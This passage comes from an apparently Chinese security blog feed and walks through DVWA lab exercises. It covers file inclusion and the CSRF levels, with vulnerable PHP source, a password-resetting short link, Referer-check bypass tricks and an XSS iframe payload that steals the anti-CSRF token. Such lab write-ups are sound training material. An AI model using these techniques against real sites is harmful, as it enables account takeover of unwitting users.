class="hljs-string">&quot;file1.php&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;file2.php&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;file3.php&quot;</span> ) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了文件包含漏洞，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。常用的文件包含函数有 include()、include_once()、require()、require_once()。<br>包含漏洞分为本地包含和原创包含 2 类，当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容不符合 php 语法，会直接将文件内容输出。例如下面这段简易的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀不能与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">on</span>（是否允许 include/require 远程文件）<br><span class="hljs-attr">allow_url_fopen</span> = <span class="hljs-literal">on</span>（是否允许打开远程文件）<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa-CSRF</title>
    <link href="/2022/06/04/dvwa-CSRF/"/>
    <url>/2022/06/04/dvwa-CSRF/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Cross-Site Request Forgery ,跨站请求伪造。通俗来讲，就是冒用用户身份进行攻击，有点像中间人攻击。它还有个亲戚，叫XSS，跨站脚本。</p></blockquote><h1 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h1><p>比较直白，让我们修改 <code>password</code><br><img src="/2022/06/04/dvwa-CSRF/1691837018096.png" alt="1691837018096"></p><h1 id="响应页面"><a href="#响应页面" class="headerlink" title="响应页面"></a>响应页面</h1><p>难绷，不进行输入直接点 <code>Change</code>,居然直接修改了密码……<br><img src="/2022/06/04/dvwa-CSRF/1691837338094.png" alt="1691837338094"></p><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/vulnerabilities/csrf/?password_new=&amp;password_conf=&amp;Change=Change</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/vulnerabilities/csrf/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=re4k3en5q4a2e9pqidrd3it4a3; security=low<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><br></code></pre></td></tr></table></figure><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>仅仅是对两次输入进行了简单比较，然而没有丝毫过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Do the passwords match?</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update the database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol><li>将GET请求行URL伪装成短网址，诱导受害者点击。</li></ol><p>这里我用 <code>http://dwurl.cn/U/Index</code>,将 <code>http://localhost/vulnerabilities/csrf/?password_new=&amp;password_conf=&amp;Change=Change#</code>生成短链 <code>https://dwurl.cn/v7ef4Q</code></p><p><img src="/2022/06/04/dvwa-CSRF/1691838559286.png" alt="1691838559286"></p><p>用 <code>curl -i</code>可以看到响应头，显示这个链接被重定向到 <code>Location</code>,直接修改密码为空。千言万语一句话，陌生链接不不要点，除非多方面求证。</p><ol start="2"><li>配合XSS ，将修改密码的URL隐藏在html标签中，比如 <code>&lt;iframe&gt;</code> <code>&lt;script&gt;</code> <code>&lt;img&gt;</code>，操作会更加隐蔽</li></ol><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>相比low 级别，<code>striops()</code>函数增加了 <code>referer</code>和 <code>server_name</code>的判断，检查了保留变量 HTTP_REFERER（http 包头的 Referer 参数的值，表示来源地址）中是否包含 SERVER_NAME（http 包头的 Host 参数，要访问的主机名），希望通过验证 http 来源的机制抵御 CSRF 攻击。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Checks to see where the request came from</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stripos</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-comment">// Get input</span><br>        <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>        <span class="hljs-comment">// Do the passwords match?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>            <span class="hljs-comment">// They do!</span><br>            <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>            <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>            <span class="hljs-comment">// Update the database</span><br>            <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>            <span class="hljs-comment">// Feedback for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Issue with passwords matching</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Didn&#x27;t come from a trusted source</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>遇河搭桥。想办法实现referer字段绕过，实际情况还得配合其他漏洞组合攻击。</p><ol><li>构造造一个exp.html,实现访问该exp.html就会自动修改密码。（怎么把exp.html放到服务器先不考虑）</li><li>绕过referer手段（三种均可）</li></ol><ul><li>目录混淆。将上述html放在<strong>127.0.0.1文件夹</strong>下面<br><code>http://localhost/127.0.0.1/exp.html</code></li><li>文件名混淆。将上述exp.html重命名为<strong>127.0.0.1.html</strong><br><code>http://localhost/127.0.0.1.html</code></li><li>URL混淆。<br><code>http://localhost/exp.html?127.0.0.1</code></li></ul><ol start="3"><li>使受害者点击构造的html</li></ol><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="http请求-1"><a href="#http请求-1" class="headerlink" title="http请求"></a>http请求</h2><p>请求中间增加了重要参数 <code>user_token</code>,这个参数会成为接下来的老熟人。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/vulnerabilities/csrf/?password_new=&amp;password_conf=&amp;Change=Change&amp;user_token=2e509f6c9d959f644cca6f90b75f7f49</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/vulnerabilities/csrf/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=re4k3en5q4a2e9pqidrd3it4a3; security=high<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br></code></pre></td></tr></table></figure><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><p>如下，代码加入了 Anti-CSRF token 机制，当用户每次访问改密页面时，服务器会返回一个随机的 token。向服务器发起请求时，需要提交 token 参数，而服务器在收到请求时会检查 token，只有 token 正确时才会处理客户端的请求。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Do the passwords match?</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update the database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>现在要想进行 CSRF 攻击就必须获取到用户的 token，而要想获取到 token 就必须利用用户的 cookie 去访问修改密码的页面，然后截取服务器返回的 token 值。<br>这里可以利用后面的XSS(Reflected) 的 high 级别的漏洞，，我们注入一个攻击脚本，使得每次打开页面时都弹出 token 值。<br>注入的 payload 如下。<br><code>&lt;iframe src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;</code></p><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>学习时间到！</p><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><p>这里相对于 High 级别主要就是增加了输入当前密码的选项，这个在实战中还是一种比较主流的防护方式，攻击者不知道原始密码的情况下是无法发起 CSRF 攻击的，另外常见的防护方法还有加验证码来防护。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_curr</span> = <span 